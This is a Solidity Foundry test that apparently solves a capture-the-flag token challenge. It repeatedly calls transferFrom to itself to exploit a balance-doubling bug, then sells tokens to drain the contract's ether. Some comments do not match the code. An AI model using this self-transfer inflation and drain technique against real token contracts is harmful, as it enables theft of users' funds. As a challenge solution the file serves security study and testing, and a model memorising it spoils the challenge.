// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {Setup} from "../src/SimpleTokenSetup.sol";
import {SimpleToken} from "../src/SimpleToken.sol";

contract SimpleTokenTest is Test {
    Setup public s;
    SimpleToken public token;

    function setUp() public {
        // Deploy Setup with 1000 wei
        s = new Setup{value: 1000}();
        token = s.token();
    }

    function testExploit() public {
        // Buy 1 token for 1000 wei
        token.buy{value: 1000}();
        assertEq(token.balanceOf(address(this)), 1);

        // Approve ourselves
        token.approve(address(this), type(uint).max);

        // Transfer to self - this doubles our balance
        for (uint i = 0; i < 12; i++) {
            token.transferFrom(
                address(this),
                address(this),
                token.balanceOf(address(this))
            );
        }
        // assertEq(token.balanceOf(address(this)), 2);

        // Sell 2 tokens to drain contract
        token.sell(address(token).balance);
        assertEq(address(token).balance, 0);

        // Verify challenge is solved
        assertTrue(s.isSolved());
    }

    receive() external payable {}
}
